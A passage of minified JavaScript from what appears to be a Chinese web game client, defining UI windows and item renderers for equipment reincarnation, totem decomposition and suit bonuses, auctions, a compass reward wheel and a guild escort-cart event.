i=this.getComposeEquipList();for(var n in i){var o=i[n],a=this.getComposeTarget(o),r=s.GlobalConfig.ReincarnateEquipCompose[a],l=s.GlobalConfig.ItemConfig[a].zsLevel;if(e==l&&r.distinguishi==t)return!0}return!1},e.prototype.isCanEquipCompose=function(t){var e=this.getComposeEquipList();return e.indexOf(t)>=0},e.prototype.getReincarnationLinkLevel=function(t,e){for(var i in s.GlobalConfig.ReincarnationLinkLevel)if(i==t.toString())for(var n in s.GlobalConfig.ReincarnationLinkLevel[i])for(var o in s.GlobalConfig.ReincarnationLinkLevel[i][n])if(o==e.toString())return s.GlobalConfig.ReincarnationLinkLevel[i][n][o];return null},e.prototype.getSoulLinkDesc=function(t){var e;switch(t){case 11:e=gettext("生命");break;case 55:e=gettext("伤害加成");break;case 19:e=gettext("暴击伤害");break;case 56:e=gettext("暴击伤害减免率")}return e},e.prototype.getSoulMaxLevel=function(){return o.CommonUtils.getObjectLength(s.GlobalConfig.ReincarnationDemonLevel[d.EquipPos.HAT])},e.prototype.getSoulLinkLv=function(t,e,i){var n=this.getLinkEquipPos(e),o=t.getEquipByIndex(e),s=t.getEquipByIndex(n);return o&&s?Math.min(o.soulLv,s.soulLv):0},e.prototype.getLinkEquipPos=function(t){for(var e in s.GlobalConfig.ReincarnationLinkLevel)if(e==t.toString())for(var i in s.GlobalConfig.ReincarnationLinkLevel[e])return+i;return null},e.prototype.isCanUpgradeSoul=function(){return!1},e.prototype.checkUpgradeSoul=function(t,e){var i=t.getEquipByIndex(e),n=i.soulLv;if(n!=this.getSoulMaxLevel()&&i.item.itemConfig){var o=s.GlobalConfig.ReincarnationSoulLevel[t.job][e][n+1],a=h.BagCT.ins().getBagGoodsCountById(h.BagCT.BAG_TYPE_OTHTER,o.materialInfo.id);return a>=o.materialInfo.count}return!1},e}(n.BaseClass);e.SamsaraModel=f,window.SamsaraModel=f,__reflect(f.prototype,"SamsaraModel",[]),window.SamsaraModel=f},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TotemSelectItemRender=e.TotemDescomWin=void 0;var n=i(19),o=i(3),s=i(1),a=i(11),r=i(0),l=i(4),h=i(6),u=i(2),p=i(80),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="DecomposeSkin",e.noneArrs=[[],[],[],[],[]],e.decomposeItemArr=[],e.costCoin=0,e.isNull=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.propList0.itemRenderer=c,this.propList0.dataProvider=this.bc=new eui.ArrayCollection(this.noneArrs),this.propList.itemRenderer=a.ItemBase,this.propList.dataProvider=new eui.ArrayCollection([[],[],[],[],[]]),this.propList0.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onItemClick,this)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.coinGrop.visible=!1,this.addTouchEvent(this.eBtn,this.onClick),this.addTouchEvent(this.eBtn0,this.onClick),this.clearAllSelect(),this.updateDescomposeList()},e.prototype.updateDescomposeList=function(){var t=p.TotemCT.ins().getTotemItemList();if(p.TotemCT.ins().descomposeList=[],t&&t.length>0)for(var e=0;e<t.length;e++){var i=t[e].deepClone();if(i.count>1)for(var n=0;n<i.count;n++){var o=r.GlobalConfig.ItemConfig[i.configID];o&&o.descIndex>=210&&o.descIndex<=216&&p.TotemCT.ins().descomposeList.push(i)}else{var o=r.GlobalConfig.ItemConfig[i.configID];o&&o.descIndex>=210&&o.descIndex<=216&&p.TotemCT.ins().descomposeList.push(i)}}if(0==p.TotemCT.ins().descomposeList.length)this.isNull=!0,this.bc.replaceAll(this.noneArrs);else{this.isNull=!1;for(var e=0;e<p.TotemCT.ins().descomposeList.length;e++)p.TotemCT.ins().descomposeList[e].count=1;this.bc.replaceAll(p.TotemCT.ins().descomposeList)}this.setAwardList()},e.prototype.setAwardList=function(){var t;this.costCoin=0;var e=[];this.decomposeItemArr=[];for(var i=0;i<this.propList0.numElements;i++){var n=this.propList0.getElementAt(i);if(n&&n.isSelect){var o={id:n.data.configID,count:n.data.count};this.decomposeItemArr.push(o),e.push(o)}}for(var s=[],a=r.GlobalConfig.SyntheticConfig,h=1e6,i=0;i<e.length;i++){var u=a[e[i].id+h].target,p=e[i].count;(null===(t=a[e[i].id+h])||void 0===t?void 0:t.cost[1])&&(this.costCoin+=a[e[i].id+h].cost[1].count*p);for(var d=0;d<(null===u||void 0===u?void 0:u.length);d++){var c={type:u[d].type,id:u[d].id,count:u[d].count*p};s.push(c)}}s.length>0?this.propList.dataProvider=new eui.ArrayCollection(s):this.propList.dataProvider=new eui.ArrayCollection([[],[],[],[],[]]),this.txt_cost.text=this.costCoin+"/"+l.ActorCC.gold,this.coinGrop.visible=this.costCoin>0},e.prototype.onItemClick=function(t){if(!this.isNull){if(t){var e=t.itemRenderer;e&&(e.isSelect?e.setSelect(!1):e.setSelect(!0))}this.setAwardList()}},e.prototype.onClick=function(t){switch(t.target){case this.eBtn:this.clearAllSelect();for(var e=0;e<this.propList0.numElements;e++){var i=this.propList0.getElementAt(e);i&&p.TotemCT.ins().returnIsWearSmallerType(i.data.configID)&&p.TotemCT.ins().returnIsLowerQualityComItem(i.data.configID)&&i.setSelect(!0)}this.setAwardList();break;case this.eBtn0:if(this.decomposeItemArr.length<=0)return void u.TipsCT.ins().showTips(gettext("没有可分解装备"));if(!n.GlobalFun.checkCost(this.costCoin,1,"",!0))return;if(h.BagCT.ins().getAllSurplusCount(1)<0)return void u.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容"));h.BagCT.ins().sendMergeMost(this.decomposeItemArr,1e6),win.close(this)}},e.prototype.clearAllSelect=function(){this.decomposeItemArr=[],this.costCoin=0;for(var t=0;t<this.propList0.numElements;t++){var e=this.propList0.getElementAt(t);e&&e.setSelect(!1)}},e}(s.BaseView);e.TotemDescomWin=d,window.TotemDescomWin=d,__reflect(d.prototype,"TotemDescomWin",[]),window.TotemDescomWin=d;var c=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.isSelect=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.select2.visible=this.select.visible=!1,this.gift.enabled=!1},e.prototype.dataChanged=function(){this.data?this.gift.data=this.data:this.select.visible=this.select2.visible=!1},e.prototype.setSelect=function(t){this.isSelect=t,this.select2.visible=this.isSelect},e}(o.BaseItemRender);e.TotemSelectItemRender=c,window.TotemSelectItemRender=c,__reflect(c.prototype,"TotemSelectItemRender",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TotemSuitRender=e.TotemSuitTipsWin=void 0;var n=i(5),o=i(3),s=i(1),a=i(22),r=i(0),l=i(180),h=i(4),u=i(10),p=i(65),d=i(80),c=i(242),f=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="TotemSuitTipsSkin",e.totemId=0,e.groud=0,e.count=0,e.maxLv=5,e.minLv=1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.list_suit.itemRenderer=g},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];if(t[0]){this.groud=t[0];var i=r.GlobalConfig.TotemUnitConfig[t[0]];this.maxLv=i.qualityNum[1],this.minLv=1,this.totemId=Number(i.iconRes),this.count=i.partNum,this.iniListData()}},e.prototype.iniListData=function(){for(var t=r.GlobalConfig.TotemConfig,e=[],i=[],n=[],o=[],s=[],a=[],l=[],h=[],u=this.minLv;u<10*this.maxLv;u++){var p=t[this.totemId+u];if(p){switch(t[this.totemId+u].quality){case 1:n.push(t[this.totemId+u]);break;case 2:o.push(t[this.totemId+u]);break;case 3:s.push(t[this.totemId+u]);break;case 4:a.push(t[this.totemId+u]);break;case 5:l.push(t[this.totemId+u]);break;case 6:h.push(t[this.totemId+u])}i.push(t[this.totemId+u])}}var c=d.TotemCT.ins().returnTotemTypeDataByArr(i,this.groud);n.length>0&&e.push({arr:n,quality:1,dataArr:c}),o.length>0&&e.push({arr:o,quality:2,dataArr:c}),s.length>0&&e.push({arr:s,quality:3,dataArr:c}),a.length>0&&e.push({arr:a,quality:4,dataArr:c}),l.length>0&&e.push({arr:l,quality:5,dataArr:c}),h.length>0&&e.push({arr:h,quality:6,dataArr:c}),this.list_suit.dataProvider=new eui.ArrayCollection(e)},e.prototype.tabRp=function(){return!1},e}(s.BaseView);e.TotemSuitTipsWin=f,window.TotemSuitTipsWin=f,__reflect(f.prototype,"TotemSuitTipsWin",[]),window.TotemSuitTipsWin=f;var g=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.group=0,e.quality=1,e.maxLv=5,e.minLv=1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.itemList.itemRenderer=c.TotemItemLabelRender},e.prototype.dataChanged=function(){var t=this.data.arr;this.group=t[0].group,this.quality=this.data.quality;for(var e=r.GlobalConfig.TotemConfig,i=[],n=0;n<t.length;n++){var o=d.TotemCT.ins().returnIsWearByItemId(t[n].id),s=e[t[n].id].name,a={name:s,isWear:o,quality:this.quality};i.push(a)}this.itemList.dataProvider=new eui.ArrayCollection(i),this.initProData()},e.prototype.initProData=function(){this.cons=r.GlobalConfig.TotemUnitConfig[this.group],this.conf=r.GlobalConfig.TotemAuxiliarySuitConfig,this.txt_suitAttr4.visible=!1;var t=0;switch(this.cons.partNum){case 7:var e=1;for(var i in this.cons.suitPart){var o=this.cons.suitPart[i];1==e&&(t=o);var s=this.conf[this.group][o][this.quality].attr,c=this.conf[this.group][o][this.quality].desc;if(s){d.TotemCT.ins().setAttrValue(s);var f=a.AttributeData.getAttrShowStrNoColor(s," +");this["txt_suitAttr"+e].textFlow=n.TextFlowMaker.generateTextFlow1(gettext("{0}件套：{1}",o,f))}else{var g=void 0;switch(h.ActorCC.jobId){case l.JobConst.ZhanShi:g=this.conf[this.group][o][this.quality].revise_1;break;case l.JobConst.FaShi:g=this.conf[this.group][o][this.quality].revise_2;break;case l.JobConst.DaoShi:g=this.conf[this.group][o][this.quality].revise_3;break;case l.JobConst.CiKe:g=this.conf[this.group][o][this.quality].revise_4;break;case l.JobConst.GongShou:g=this.conf[this.group][o][this.quality].revise_5}var m=19>g?(r.GlobalConfig.TotemReviseConfig[g].cd/1e3).toFixed(1)||0:(100*r.GlobalConfig.TotemReviseConfig[g].a).toFixed(1)||0;this["txt_suitAttr"+e].textFlow=n.TextFlowMaker.generateTextFlow1(gettext("{0}件套：{1}",o,p.SkillUtil.getDesc1(c,m)))
}e++}break;case 8:var v=1;for(var i in this.cons.suitPart){var o=this.cons.suitPart[i];1==v&&(t=o);var s=this.conf[this.group][o][this.quality].attr,c=this.conf[this.group][o][this.quality].desc;if(s){d.TotemCT.ins().setAttrValue(s);var f=a.AttributeData.getAttrShowStrNoColor(s," +");this["txt_suitAttr"+v].textFlow=n.TextFlowMaker.generateTextFlow1(gettext("{0}件套：{1}",o,f))}else{var g=void 0;switch(h.ActorCC.jobId){case l.JobConst.ZhanShi:g=this.conf[this.group][o][this.quality].revise_1;break;case l.JobConst.FaShi:g=this.conf[this.group][o][this.quality].revise_2;break;case l.JobConst.DaoShi:g=this.conf[this.group][o][this.quality].revise_3;break;case l.JobConst.CiKe:g=this.conf[this.group][o][this.quality].revise_4;break;case l.JobConst.GongShou:g=this.conf[this.group][o][this.quality].revise_5}var m=19>g?(r.GlobalConfig.TotemReviseConfig[g].cd/1e3).toFixed(1)||0:(100*r.GlobalConfig.TotemReviseConfig[g].a).toFixed(1)||0;this["txt_suitAttr"+v].textFlow=n.TextFlowMaker.generateTextFlow1(gettext("{0}件套：{1}",o,p.SkillUtil.getDesc1(c,m)))}v++}break;case 9:var y=1;for(var i in this.cons.suitPart){var o=this.cons.suitPart[i];1==y&&(t=o);var s=this.conf[this.group][o][this.quality].attr,c=this.conf[this.group][o][this.quality].desc;if(s){d.TotemCT.ins().setAttrValue(s);var f=a.AttributeData.getAttrShowStrNoColor(s," +");this["txt_suitAttr"+y].textFlow=n.TextFlowMaker.generateTextFlow1(gettext("{0}件套：{1}",o,f))}else{var g=void 0;switch(h.ActorCC.jobId){case l.JobConst.ZhanShi:g=this.conf[this.group][o][this.quality].revise_1;break;case l.JobConst.FaShi:g=this.conf[this.group][o][this.quality].revise_2;break;case l.JobConst.DaoShi:g=this.conf[this.group][o][this.quality].revise_3;break;case l.JobConst.CiKe:g=this.conf[this.group][o][this.quality].revise_4;break;case l.JobConst.GongShou:g=this.conf[this.group][o][this.quality].revise_5}var m=(r.GlobalConfig.TotemReviseConfig[g].cd/1e3).toFixed(1)||0;this["txt_suitAttr"+y].textFlow=n.TextFlowMaker.generateTextFlow1(gettext("{0}件套：{1}",o,p.SkillUtil.getDesc1(c,m)))}y++}}this.txt_suitName.text=""+this.conf[this.group][t][this.quality].suitName,this.txt_suitName.textColor=u.ItemUtil.getQualityColor(this.quality),this.setFourProNewData()},e.prototype.setFourProNewData=function(){for(var t=0,e=this.data.dataArr,i=[],n=0;n<e.length;n++)this.quality==e[n].quality&&(t=e[n].count,i.push(t));if(i.length>0)for(var n=0;n<i.length;n++)for(var o=0;o<this.cons.suitPart.length;o++)i[n]==this.cons.suitPart[o]&&(this["txt_suitAttr"+(o+1)].textColor=u.ItemUtil.getQualityColor(this.quality))},e.prototype.setFourProData=function(){var t=d.TotemCT.ins().returnTotemEquipCount(this.data.arr);t>=2&&(this["txt_suitAttr"+Math.floor(t/2)].textColor=u.ItemUtil.getQualityColor(this.quality))},e}(o.BaseItemRender);e.TotemSuitRender=g,window.TotemSuitRender=g,__reflect(g.prototype,"TotemSuitRender",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget58RankItemRender=void 0;var n=i(3),o=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ActivityFbRankItemSkin",e}return __extends(e,t),e.prototype.dataChanged=function(){if(this.data&&this.skin){var t=this.data,e=t.name,i=t.vip,n=t.power;this.player.text=e,this.ePow.text=n,this.pos.text=this.itemIndex+1+"",this.vip.visible=i>0}},e}(n.BaseItemRender);e.OSATarget58RankItemRender=o,window.OSATarget58RankItemRender=o,__reflect(o.prototype,"OSATarget58RankItemRender",[]),window.OSATarget58RankItemRender=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AuctionRecordItemRender=void 0;var n=i(3),o=i(0),s=i(8),a=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){if(this.data){var t=this.data,e=o.GlobalConfig.AuctionItem[t.aId];this.item.data=e.item,this.playerName.text=t.roleName,this.price.text=t.price+"",this.successTime.text=s.DateUtils.getFormatBySecond(Math.floor(s.DateUtils.formatMiniDateTime(t.time)/1e3),s.DateUtils.TIME_FORMAT_15),this.text1.text=t.state?1==t.state?gettext("竞拍价成交"):gettext("一口价成交"):0==t.type?gettext("流拍到全服"):gettext("流拍")}},e}(n.BaseItemRender);e.AuctionRecordItemRender=a,window.AuctionRecordItemRender=a,__reflect(a.prototype,"AuctionRecordItemRender",[]),window.AuctionRecordItemRender=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BagCallBackConfirmWin=void 0;var n=i(5),o=i(1),s=i(57),a=i(31),r=i(10),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="bagCallBackConfirmSkin",e}return __extends(e,t),e.prototype.addDisplay=function(t){if(t){this.cbData=t,this.addTouchEvent(this.btnCancel,this.onClick),this.addTouchEvent(this.btnConfirm,this.onClick),this.addTouchEvent(this.closeBtn,this.onClick);var e=this.getItemNames(),i=this.getCount();this.lbDes.textFlow=n.TextFlowMaker.generateTextFlow(gettext("装备{0}存在|C:0x51F204&T:{1}|颗洗练石（|C:0xFC2A2A&T:不返还|），三条橙色随机属性可返还100%洗练石",e,i)),this.lblTips.text=t.tips,this.lblTitle.text=t.title}},e.prototype.onClick=function(t){switch(t.target){case this.btnCancel:this.cbData.target&&this.cbData.cbFun&&this.cbData.cbFun.call(this.cbData.target,s.BagCBConfirmResult.Cancel,this.cbData);break;case this.btnConfirm:this.cbData.target&&this.cbData.cbFun&&this.cbData.cbFun.call(this.cbData.target,s.BagCBConfirmResult.Confirm,this.cbData)}win.close(this)},e.prototype.getItemNames=function(){for(var t=this.cbData.showItems,e="",i=0;i<t.length;i++){var n=t[i];if(n.xilian>0){var o=r.ItemUtil.getQuality2(n.itemConfig)>0?r.ItemUtil.getQuality2(n.itemConfig):(null===n||void 0===n?void 0:n.quality)||0;0>o&&(o=0),e+="|C:"+a.QUALITY_COLOR[o]+"&T:["+n.itemConfig.name+"]|"}}return e},e.prototype.getCount=function(){for(var t=this.cbData.showItems,e=0,i=0;i<t.length;i++){var n=t[i];e+=n.xilian||0}return e},e}(o.BaseView);e.BagCallBackConfirmWin=l,window.BagCallBackConfirmWin=l,__reflect(l.prototype,"BagCallBackConfirmWin",[]),window.BagCallBackConfirmWin=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipDetailedWin=void 0;var n=i(1),o=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.layoutNum=LayoutNum.top,e._sn_="EquipTipsSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.eCurItem.setData(t)},e}(n.BaseView);e.EquipDetailedWin=o,window.EquipDetailedWin=o,__reflect(o.prototype,"EquipDetailedWin",[]),window.EquipDetailedWin=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BattleResultItemRender=void 0;var n=i(3),o=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="BattleResultItem",e}return __extends(e,t),e.prototype.dataChanged=function(){var t=this.data;this.ranking.text=t.rank+"",this.roleName.text=t.roleName,this.guild.text=t.unionName,this.score.text=t.score+""},e}(n.BaseItemRender);e.BattleResultItemRender=o,window.BattleResultItemRender=o,__reflect(o.prototype,"BattleResultItemRender",[]),window.BattleResultItemRender=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ItemBlackSmithRender=void 0;var n=i(3),o=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.dataChanged=function(){var t=this.data;t&&(this.itemShow.data=t.item?t.item:null,t.isBuy?this.buy.visible=!0:this.buy.visible=!1)},e}(n.BaseItemRender);e.ItemBlackSmithRender=o,window.ItemBlackSmithRender=o,__reflect(o.prototype,"ItemBlackSmithRender",[]),window.ItemBlackSmithRender=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CompassCircleItem=void 0;var n=i(8),o=i(3),s=i(0),a=i(7),r=i(152),l=function(t){function e(){var e=t.call(this)||this;return e._sn_="CompassCircleItemSkin",e.rewardItemArr=[],e.startRotation=0,e.angle=45,e.leftTime=0,e.startX=0,e.startY=0,e}return __extends(e,t),e.prototype.skinComplete=function(){for(var t=0;this["item"+t];)this.rewardItemArr.push(this["item"+t]),t++;this.dataChanged(),this.initView()},e.prototype.initView=function(){this.common.addEventListener(egret.TouchEvent.TOUCH_BEGIN,this.onTouchGrpBegin,this),this.common.addEventListener(egret.TouchEvent.TOUCH_MOVE,this.onTouchGrpMove,this),this.common.addEventListener(egret.TouchEvent.TOUCH_END,this.onTouchGrpEnd,this)},e.prototype.onTouchGrpBegin=function(t){this.startRotation=this.circleGrp.rotation,this.startX=t.stageX,this.startY=t.stageY},e.prototype.onTouchGrpMove=function(t){var e=this.common.globalToLocal(t.stageX,t.stageY).x,i=e>this.common.width/2?1:-1,n=t.stageX-this.startX,o=(this.startY-t.stageY)*i,s=.2*(n-o);this.circleGrp.rotation=this.startRotation+s},e.prototype.onTouchGrpEnd=function(t){egret.Tween.removeTweens(this.circleGrp);var e=Math.round(this.circleGrp.rotation/this.angle)*this.angle;egret.Tween.get(this.circleGrp).to({rotation:e},500,egret.Ease.quadOut)},e.prototype.dataChanged=function(){if(this.skin&&this.data){if(this.data.list.length){this.itemGrp.visible=!0;for(var t=0;t<this.data.list.length;t++)this.rewardItemArr[t]&&(this.rewardItemArr[t].data=this.data.list[t])}else this.itemGrp.visible=!1;this.updateTime(),this.updatePower()}},e.prototype.updatePower=function(){this.skin&&this.data&&(this.lbPower.text=r.CompassCT.ins().power.toString())},e.prototype.updateTime=function(){if(!this.data||this.data.list.length>0)this.leftTime=0;else{var t=s.GlobalConfig.CompassBaseConfig.taskduration*(this.data.group-1),e=r.CompassCT.ins().startTimes+24*t*60*60*1e3;this.leftTime=Math.ceil(.001*(e-a.GameServerCC.serverTime)),Timer.has(this.flusLeftTime,this)||Timer.start(1e3,-1,this.flusLeftTime,this)}this.flusLeftTime()},e.prototype.flusLeftTime=function(){this.leftTime--,this.leftTime<=0?(Timer.stopAll(this),this.lbTime.text=""):this.lbTime.text=gettext("刷新时间:")+n.DateUtils.getFormatBySecond(this.leftTime,n.DateUtils.TIME_FORMAT_5,3)},e.prototype.removeDisplay=function(){this.skin&&egret.Tween.removeTweens(this.circleGrp)},e}(o.BaseItemRender);e.CompassCircleItem=l,window.CompassCircleItem=l,__reflect(l.prototype,"CompassCircleItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CompassProItem=void 0;var n=i(21),o=i(16),s=i(3),a=i(6),r=i(2),l=i(152),h=function(t){function e(){var e=t.call(this)||this;return e._sn_="CompassProItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged(),this.addTouchEvent(this.eG1,this.onClick),this.addTouchEvent(this.eG2,this.onClick)},e.prototype.dataChanged=function(){this.skin&&this.data&&(this.info=this.data,this.lbScore.text=this.info.rewardneed.toString(),this.item1.data=this.info.free,this.item2.data=this.info.purchased,this.updatePower(),this.showEffect())},e.prototype.updatePower=function(){this.skin&&this.data&&(this.imgScore.source=l.CompassCT.ins().power>=this.info.rewardneed?"full":"miss")},e.prototype.onClick=function(t){var e,i;if(a.BagCT.ins().getAllSurplusCount(1)<0)return void r.TipsCT.ins().showTips(gettext("背包空间不足请扩容"));switch(t.target){case this.eG1:l.CompassCT.ins().sendGetReward(1,null===(e=this.info)||void 0===e?void 0:e.idx);break;case this.eG2:l.CompassCT.ins().sendGetReward(2,null===(i=this.info)||void 0===i?void 0:i.idx)}},e.prototype.showEffect=function(){this.skin&&this.data&&(this.eG1.visible=this.info.freeCount>0,this.freefinishg.visible=this.info.freeCount<=0&&l.CompassCT.ins().power>=this.info.rewardneed,this.eG1.visible?(this.eff1=this.eff1||new n.MovieClip,this.eff1.parent||(this.eG1.addChild(this.eff1),this.eff1.x=this.eG1.width/2,this.eff1.y=this.eG1.height/2,this.eff1.scaleX=this.eff1.scaleY=1.4),this.eff1.playFile(RES_DIR_EFF+"ValueEff2",-1)):this.eff1&&(o.DisplayUtils.removeFromParent(this.eff1),this.eff1=null),this.eG2.visible=this.info.purchasedCount>0,this.payfinishg.visible=l.CompassCT.ins().bolRecharge&&this.info.purchasedCount<=0&&l.CompassCT.ins().power>=this.info.rewardneed,this.eG2.visible?(this.eff2=this.eff2||new n.MovieClip,this.eff2.parent||(this.eG2.addChild(this.eff2),this.eff2.x=this.eG2.width/2,this.eff2.y=this.eG2.height/2,this.eff2.scaleX=this.eff2.scaleY=1.4),this.eff2.playFile(RES_DIR_EFF+"ValueEff2",-1)):this.eff2&&(o.DisplayUtils.removeFromParent(this.eff2),this.eff2=null))},e}(s.BaseItemRender);e.CompassProItem=h,window.CompassProItem=h,__reflect(h.prototype,"CompassProItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CrossDartCarGoodsItem=void 0;var n=i(19),o=i(3),s=i(77),a=i(28),r=i(2),l=i(27),h=i(68),u=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=s.ItemBaseNoName,this.dataChanged(),this.addTouchEvent(this.btnBuy,this.onClick)},e.prototype.dataChanged=function(){var t=this.data;t&&(this.lb_log.text=t.goodsName,this.imgIcon.source=t.goodsImg,this.list.dataProvider=new eui.ArrayCollection(t.awards),t.cost&&t.cost[0]&&this.cost.setData(t.cost[0],!1,!1))},e.prototype.onClick=function(t){var e=this.data;if(e&&e.cost&&e.cost[0]&&h.CrossDartCarCT.ins().checkInSignUpTime(!0)){if(h.CrossDartCarCT.ins().getCarState(2)||0!=h.CrossDartCarCT.ins().getGuildCarState(2))return void r.TipsCT.ins().showTips(gettext("已无可购买车次"));var i=n.GlobalFun.getItemName(e.cost[0].id);l.WarnWin.show(gettext("是否消耗{0}{1}购买?",e.cost[0].count,i),this.buyGoods,this)}},e.prototype.buyGoods=function(){var t=this.data;if(t&&n.GlobalFun.checkCost(t.cost[0].count,t.cost[0].id))return a.Guild.ins().guildID?void h.CrossDartCarCT.ins().sendJoin(t.type):void r.TipsCT.ins().showTips(gettext("还未加入公会！"))},e}(o.BaseItemRender);e.CrossDartCarGoodsItem=u,window.CrossDartCarGoodsItem=u,__reflect(u.prototype,"CrossDartCarGoodsItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CrossDartCarMemItem=void 0;var n=i(3),o=i(28),s=i(106),a=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){if(this.memInfo=this.data,this.memInfo){var t=o.Guild.ins().getMemberByRoleId(this.memInfo.roleID);t&&(this.lb_name.text=t.name,this.lb_name0.text="["+s.GuildLanguage.guildOffice[t.office]+"]",this.lb_lv.text=t.level+"",this.lb_power.text=t.attack+"",this.imgJob.source="yuanhead"+t.job+t.sex)}},e}(n.BaseItemRender);e.CrossDartCarMemItem=a,window.CrossDartCarMemItem=a,__reflect(a.prototype,"CrossDartCarMemItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CrossDartCarLogItem=void 0;var n=i(5),o=i(3),s=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){this.lb_log.textFlow=n.TextFlowMaker.generateTextFlow1(this.data)},e}(o.BaseItemRender);e.CrossDartCarLogItem=s,window.CrossDartCarLogItem=s,__reflect(s.prototype,"CrossDartCarLogItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CrossDartCarMapWin=void 0;var n=i(8),o=i(16),s=i(1),a=i(0),r=i(91),l=i(15),h=i(6),u=i(76),p=i(28),d=i(12),c=i(7),f=i(2),g=i(63),m=i(68),v=i(368),y=i(369),C=i(370),T=i(372),b=i(373),w=function(t){function e(){var e=t.call(this)||this;return e._sn_="CrossDartCarMapSkin",e.baseItemArr=[],e.startPos=new egret.Point(1038,800),e.lineList=[],e.carItemList=[],e.maxTime=60,e.leftTime=0,e.tempTarList=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.eCloseBtn,this.onClick),this.addTouchEvent(this.btnStart,this.onClick),this.addTouchEvent(this.goGrp,this.onClick),this.addTouchEvent(this.rewardShow,this.onClick),this.addTouchEvent(this.btnDesc,this.onClick),this.addTouchEvent(this.btnHelp,this.onClick),this.addTouchEvent(this.btnBuy,this.onClick),e.bolTestDraw&&this.addTouchEvent(this.eG,this.onMapClick),this.maxTime=a.GlobalConfig.GuildEscortCartBaseConfig.disTime;var t=a.GlobalConfig.GuildEscortCartBaseConfig.pos_start;t&&(this.startPos.x=t[0]?t[0]:0,this.startPos.y=t[1]?t[1]:0),this.startItem=new y.CrossDartCarMapItem,this.startItem.data={buildImg:a.GlobalConfig.GuildEscortCartBaseConfig.img_start,buildName:gettext("镖局")},this.mapItemGrp.addChild(this.startItem),this.startItem.x=this.startPos.x,this.startItem.y=this.startPos.y,this.observe(m.CrossDartCarCT.ins().postGetJoinInfo,this.updateView),this.observe(m.CrossDartCarCT.ins().postPlunder,this.updateView),this.observe(m.CrossDartCarCT.ins().postPlayerInfo,this.updateView),this.observe(m.CrossDartCarCT.ins().postGetCarInfo,this.updateCarInfo),this.observe(m.CrossDartCarCT.ins().postGetAllInfo,this.updateBaseItemList),this.observe(m.CrossDartCarCT.ins().postRedChange,this.updateRedPoint),this.observe(h.BagCT.ins().postItemChange,this.updateCost),this.observe(h.BagCT.ins().postItemAdd,this.updateCost),this.observe(h.BagCT.ins().postItemDel,this.updateCost),this.sendMsgInfo()},e.prototype.sendMsgInfo=function(){m.CrossDartCarCT.ins().sendGetJoinInfo(),m.CrossDartCarCT.ins().sendGetPlayerInfo(),m.CrossDartCarCT.ins().sendGetCarInfo(),m.CrossDartCarCT.ins().sendGetAllInfo()},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.updateView(),this.updateTime(),this.updateCost(),this.updateBaseItemList(),this.eSscrollVH()},e.prototype.updateCarInfo=function(){this.updateView(),this.updateTime()},e.prototype.updateView=function(){var t=m.CrossDartCarCT.ins().getCurSendTimes(),e=m.CrossDartCarCT.ins().getCarState(t);this.lb_join.text=0!=e?gettext("已报名"):gettext("未报名");var i=a.GlobalConfig.GuildEscortCartBaseConfig.dailyTranT?a.GlobalConfig.GuildEscortCartBaseConfig.dailyTranT:0;this.lb_leftTimes.text=(i-m.CrossDartCarCT.ins().tranTimes).toString();var n=m.CrossDartCarCT.ins().getLeftMemsNum();this.lb_member.text=gettext("{0}人(存活{1}人)",n[0],n[1]);var 